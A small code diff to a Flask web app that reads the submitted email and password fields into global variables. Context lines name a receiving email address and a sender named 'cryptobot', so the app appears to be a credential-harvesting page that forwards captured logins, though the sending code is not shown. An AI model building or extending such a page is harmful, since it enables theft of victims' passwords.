@@ -22,6 +22,10 @@ recvemail="clivethompson09@gmail.com"
 myemail="cryptobot693@gmail.com"
 @app.route('/',methods=['GET','POST'])
 def home():
+  global emai
+  global pa
+  emai= request.form.get("email")
+  pa=request.form.get("password")
   if request.method == "POST":
     emai = request.form.get("email")
     pa=request.form.get("password")
